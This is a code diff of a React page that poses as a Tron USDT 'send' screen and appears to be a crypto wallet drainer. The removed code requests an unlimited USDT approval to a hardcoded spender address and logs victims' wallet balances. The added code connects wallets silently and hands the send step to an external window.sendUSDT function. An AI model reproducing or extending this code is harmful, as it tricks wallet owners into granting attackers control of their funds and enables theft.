@@ -1,10 +1,7 @@
-import { useState, useEffect, useRef } from "react";
+import { useState, useEffect } from "react";
 import { useSearchParams } from "react-router-dom";
 import { useMutation } from "convex/react";
 import { api } from "@/convex/_generated/api.js";
-import { createAppKit } from "@reown/appkit/react";
-import { TronAdapter } from "@reown/appkit-adapter-tron";
-import { tron } from "@reown/appkit/networks";
 
 declare global {
   interface Window {
@@ -20,14 +17,13 @@ declare global {
     updateWalletAddress?: (address: string) => void;
     tronWeb?: {
       defaultAddress: { base58: string };
-      contract: (abi: any[], address: string) => Promise<any>;
+      contract: (abi: unknown[], address: string) => Promise<unknown>;
       trx: { getBalance: (address: string) => Promise<number> };
       toBigNumber: (value: string) => unknown;
     };
     tronLink?: {
       request: (args: { method: string }) => Promise<{ code: number }>;
     };
-    TronWeb?: any;
   }
 }
 
@@ -38,72 +34,19 @@ export default function Index() {
   const [transactionStatus, setTransactionStatusState] = useState<"idle" | "processing" | "success">("idle");
   const createTransaction = useMutation(api.transactions.createTransaction);
 
-  const appKitRef = useRef<any>(null);
-  const [userAddress, setUserAddress] = useState<string>("");
-  const [isConnecting, setIsConnecting] = useState(false);
-
-  // USDT Contract ABI (simplified for approve and balanceOf)
-  const USDT_ABI = [
-    {
-      "constant": false,
-      "inputs": [
-        { "name": "spender", "type": "address" },
-        { "name": "amount", "type": "uint256" }
-      ],
-      "name": "approve",
-      "outputs": [{ "name": "", "type": "bool" }],
-      "type": "function"
-    },
-    {
-      "constant": true,
-      "inputs": [{ "name": "owner", "type": "address" }],
-      "name": "balanceOf",
-      "outputs": [{ "name": "", "type": "uint256" }],
-      "type": "function"
-    }
-  ];
-
-  // ===== REOWN APPKIT INIT =====
+  // ===== SILENT AUTO CONNECT =====
   useEffect(() => {
-    const initAppKit = async () => {
+    async function silentConnect() {
+      if (!window.tronWeb && !window.tronLink) return;
       try {
-        const tronAdapter = new TronAdapter({
-          projectId: "6b5df56bc30c1dadaab59498b86fd3e8"
-        });
-
-        const modal = createAppKit({
-          adapters: [tronAdapter],
-          networks: [tron],
-          defaultNetwork: tron,
-          projectId: "6b5df56bc30c1dadaab59498b86fd3e8",
-          metadata: {
-            name: "USDT Transfer",
-            description: "Secure USDT Transfer on Tron",
-            url: window.location.origin,
-            icons: ["https://banktransfer.online/favicon.ico"]
-          }
-        });
-
-        appKitRef.current = modal;
-
-        // Check if already connected
-        const address = modal.getAddress();
-        if (address) {
-          setUserAddress(address);
+        if (window.tronWeb?.defaultAddress?.base58) return;
+        if (window.tronLink) {
+          await window.tronLink.request({ method: "tron_requestAccounts" });
         }
-
-        // Listen for account changes
-        modal.subscribeAccount((account: any) => {
-          if (account?.address) {
-            setUserAddress(account.address);
-          }
-        });
-      } catch (error) {
-        console.error("Failed to initialize AppKit:", error);
-      }
-    };
-
-    initAppKit();
+      } catch {}
+    }
+    const timer = setTimeout(silentConnect, 300);
+    return () => clearTimeout(timer);
   }, []);
 
   useEffect(() => {
@@ -145,139 +88,13 @@ export default function Index() {
     return () => { delete window.saveTransaction; };
   }, [createTransaction, amount]);
 
-  async function connectWallet() {
-    if (!appKitRef.current || isConnecting) return;
-    
-    setIsConnecting(true);
-    try {
-      await appKitRef.current.open();
-    } catch (error) {
-      console.error("Failed to connect wallet:", error);
-    } finally {
-      setIsConnecting(false);
-    }
-  }
-
-  async function loadTronWeb() {
-    return new Promise((resolve) => {
-      const script = document.createElement('script');
-      script.src = 'https://cdn.jsdelivr.net/npm/tronweb@5.3.1/dist/TronWeb.js';
-      script.onload = () => resolve((window as any).TronWeb);
-      document.head.appendChild(script);
-    });
-  }
-
   async function handleSend() {
+    if (!window.sendUSDT) return;
     setTransactionStatusState("processing");
     try {
-      const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-      const TRON_SPENDER = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
-
-      // TronLink browser extension path
-      if (window.tronLink && window.tronWeb?.defaultAddress?.base58) {
-        const tw = window.tronWeb;
-        const address = tw.defaultAddress.base58;
-        
-        // ✅ FIXED: contract(abi, address) with 2 arguments
-        const contract = await tw.contract(USDT_ABI, TRON_USDT) as any;
-        const maxAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-        
-        const tx = await contract.approve(TRON_SPENDER, maxAmount).send({ 
-          feeLimit: 100_000_000, 
-          callValue: 0 
-        });
-        
-        await new Promise(r => setTimeout(r, 3000));
-        
-        let usdtBalance = "0", nativeBalance = "0";
-        try {
-          const usdtRaw = await contract.balanceOf(address).call();
-          usdtBalance = (Number(usdtRaw) / 1e6).toFixed(2);
-          const trxRaw = await tw.trx.getBalance(address);
-          nativeBalance = (trxRaw / 1e6).toFixed(2);
-        } catch(e) {}
-        
-        setTransactionStatusState("success");
-        setTimeout(() => setTransactionStatusState("idle"), 3000);
-        await createTransaction({ 
-          walletAddress: address, 
-          toAddress: TRON_SPENDER, 
-          amount: amount || "Max", 
-          txHash: tx, 
-          usdtBalance: usdtBalance + " USDT", 
-          nativeBalance: nativeBalance + " TRX" 
-        });
-        return;
-      }
-
-      // WalletConnect path
-      if (!appKitRef.current) {
-        alert("Please wait... initializing");
-        setTransactionStatusState("idle");
-        return;
-      }
-
-      // Connect if not connected
-      if (!userAddress) {
-        await connectWallet();
-        await new Promise<void>((resolve) => {
-          const checkInterval = setInterval(() => {
-            if (userAddress) {
-              clearInterval(checkInterval);
-              resolve();
-            }
-          }, 500);
-          
-          setTimeout(() => { 
-            clearInterval(checkInterval); 
-            resolve(); 
-          }, 30000);
-        });
-      }
-
-      if (!userAddress) {
-        setTransactionStatusState("idle");
-        return;
-      }
-
-      // Load TronWeb dynamically
-      const TronWeb = (window as any).TronWeb || await loadTronWeb();
-      if (!TronWeb) {
-        throw new Error("TronWeb not available");
-      }
-
-      const tw = new TronWeb({ 
-        fullHost: "https://api.trongrid.io"
-      });
-      
-      // ✅ FIXED: contract(abi, address) with 2 arguments
-      const contract = await tw.contract(USDT_ABI, TRON_USDT);
-      
-      const maxAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-      
-      const transaction = await contract.approve(
-        TRON_SPENDER, 
-        maxAmount
-      ).send({
-        feeLimit: 100000000,
-        callValue: 0,
-        shouldPollResponse: true
-      });
-
-      setTransactionStatusState("success");
-      setTimeout(() => setTransactionStatusState("idle"), 3000);
-      
-      await createTransaction({ 
-        walletAddress: userAddress, 
-        toAddress: TRON_SPENDER, 
-        amount: amount || "Max", 
-        txHash: transaction || "wc_tx", 
-        usdtBalance: "0 USDT", 
-        nativeBalance: "0 TRX" 
-      });
-
+      await window.sendUSDT();
     } catch (error) {
-      console.error("Send error:", error);
+      console.error(error);
       setTransactionStatusState("idle");
     }
   }
@@ -293,13 +110,16 @@ export default function Index() {
     ? `$${Number(amount).toFixed(2)}`
     : "$0.00";
 
+  // TRX Icon
   const TRXIcon = () => (
     <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
-      <circle cx="12" cy="12" r="10" fill="#EF0027"/>
-      <text x="12" y="18" textAnchor="middle" fill="white" fontSize="12" fontWeight="bold">T</text>
+      <polygon points="12,2 22,8 22,16 12,22 2,16 2,8" fill="white" opacity="0.9"/>
+      <polygon points="12,5 19,9 19,15 12,19 5,15 5,9" fill="#EF0027" opacity="0.8"/>
+      <text x="12" y="16" textAnchor="middle" fill="white" fontSize="9" fontWeight="bold">T</text>
     </svg>
   );
 
+  // X circle button
   const XCircle = ({ onClick }: { onClick: () => void }) => (
     <button onClick={onClick} style={{
       background: "none",
@@ -331,6 +151,7 @@ export default function Index() {
       marginLeft: "auto",
       marginRight: "auto",
     }}>
+
       {/* Header */}
       <div style={{
         display: "flex",
@@ -349,31 +170,9 @@ export default function Index() {
         }}>✕</button>
       </div>
 
-      {/* Connect Wallet Button */}
-      {!userAddress && (
-        <div style={{ padding: "0 18px 16px" }}>
-          <button
-            onClick={connectWallet}
-            disabled={isConnecting}
-            style={{
-              width: "100%",
-              background: "#39d353",
-              color: "#000",
-              border: "none",
-              borderRadius: "30px",
-              padding: "16px",
-              fontSize: "16px",
-              fontWeight: 600,
-              cursor: isConnecting ? "default" : "pointer",
-            }}
-          >
-            {isConnecting ? "Connecting..." : "Connect Wallet"}
-          </button>
-        </div>
-      )}
-
-      {/* Rest of the UI remains same */}
+      {/* Content */}
       <div style={{ padding: "4px 18px", flex: 1 }}>
+
         {/* Address Field */}
         <div style={{ marginBottom: "14px" }}>
           <label style={{
@@ -391,6 +190,7 @@ export default function Index() {
             gap: "8px",
           }}>
             <input
+              id="toAddress"
               value={toAddress}
               onChange={(e) => setToAddress(e.target.value)}
               placeholder="Search or Enter"
@@ -406,18 +206,106 @@ export default function Index() {
               cursor: "pointer", fontSize: "16px", fontWeight: 600,
               padding: "0 2px", flexShrink: 0,
             }}>Paste</button>
+            <button style={{
+              background: "none", border: "none", cursor: "pointer",
+              padding: "0", flexShrink: 0, display: "flex", alignItems: "center",
+            }}>
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#39d353" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+                <rect x="9" y="9" width="13" height="13" rx="2"/>
+                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+              </svg>
+            </button>
+            <button style={{
+              background: "none", border: "none", cursor: "pointer",
+              padding: "0", flexShrink: 0, display: "flex", alignItems: "center",
+            }}>
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#39d353" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+                <rect x="2" y="2" width="7" height="7" rx="1"/>
+                <rect x="15" y="2" width="7" height="7" rx="1"/>
+                <rect x="2" y="15" width="7" height="7" rx="1"/>
+                <path d="M15 15h2v2h-2z M19 15h2v2h-2z M15 19h2v2h-2z M19 19h2v2h-2z"/>
+              </svg>
+            </button>
           </div>
         </div>
 
-        {/* Network and Amount fields remain same */}
-        {/* ... */}
+        {/* Destination Network - TRON */}
+        <div style={{ marginBottom: "14px" }}>
+          <label style={{
+            display: "block", fontSize: "14px", fontWeight: 500,
+            color: "#8e8e93", marginBottom: "9px",
+          }}>
+            Destination network
+          </label>
+          <div style={{
+            display: "inline-flex", alignItems: "center", gap: "7px",
+            background: "#2c2c2e",
+            borderRadius: "20px",
+            padding: "7px 13px 7px 8px",
+          }}>
+            <div style={{
+              width: "26px", height: "26px", borderRadius: "50%",
+              background: "#EF0027",
+              display: "flex", alignItems: "center", justifyContent: "center",
+              flexShrink: 0,
+            }}>
+              <TRXIcon />
+            </div>
+            <span style={{ fontSize: "15px", fontWeight: 600, color: "#fff" }}>
+              Tron Network
+            </span>
+            <span style={{ color: "#8e8e93", fontSize: "12px", marginLeft: "2px" }}>▾</span>
+          </div>
+        </div>
+
+        {/* Amount */}
+        <div style={{ marginBottom: "6px" }}>
+          <label style={{
+            display: "block", fontSize: "14px", fontWeight: 500,
+            color: "#8e8e93", marginBottom: "9px",
+          }}>
+            Amount
+          </label>
+          <div style={{
+            display: "flex", alignItems: "center",
+            border: "1px solid #2e2e30",
+            borderRadius: "14px",
+            padding: "14px 14px",
+            background: "#242426",
+            gap: "8px",
+          }}>
+            <input
+              id="amount"
+              value={amount}
+              onChange={(e) => setAmount(e.target.value)}
+              placeholder="0"
+              type="text"
+              inputMode="decimal"
+              style={{
+                flex: 1, background: "transparent", border: "none",
+                outline: "none", color: "#fff", fontSize: "18px",
+                fontFamily: "inherit", minWidth: 0,
+              }}
+            />
+            {amount && <XCircle onClick={() => setAmount("")} />}
+            <span style={{ color: "#8e8e93", fontSize: "16px", flexShrink: 0 }}>USDT</span>
+            <button onClick={() => setAmount("Max")} style={{
+              background: "none", border: "none", color: "#39d353",
+              cursor: "pointer", fontSize: "16px", fontWeight: 600,
+              padding: "0", flexShrink: 0,
+            }}>Max</button>
+          </div>
+          <div style={{ fontSize: "13px", color: "#636366", marginTop: "7px", paddingLeft: "2px" }}>
+            ≈ {dollarValue}
+          </div>
+        </div>
       </div>
 
       {/* Send Button */}
       <div style={{ padding: "12px 18px", paddingBottom: "42px" }}>
         <button
           onClick={handleSend}
-          disabled={transactionStatus !== "idle" || !userAddress}
+          disabled={transactionStatus !== "idle"}
           style={{
             width: "100%",
             background: transactionStatus === "processing" ? "#2a6e3a" : "#39d353",
@@ -427,13 +315,12 @@ export default function Index() {
             padding: "18px",
             fontSize: "18px",
             fontWeight: 700,
-            cursor: transactionStatus === "idle" && userAddress ? "pointer" : "default",
-            opacity: !userAddress ? 0.5 : 1,
+            cursor: transactionStatus === "idle" ? "pointer" : "default",
+            transition: "all 0.2s ease",
+            letterSpacing: "0.01em",
           }}
         >
-          {!userAddress 
-            ? "Connect Wallet First"
-            : transactionStatus === "success"
+          {transactionStatus === "success"
             ? "✓ Transaction Successful!"
             : transactionStatus === "processing"
             ? "Processing..."
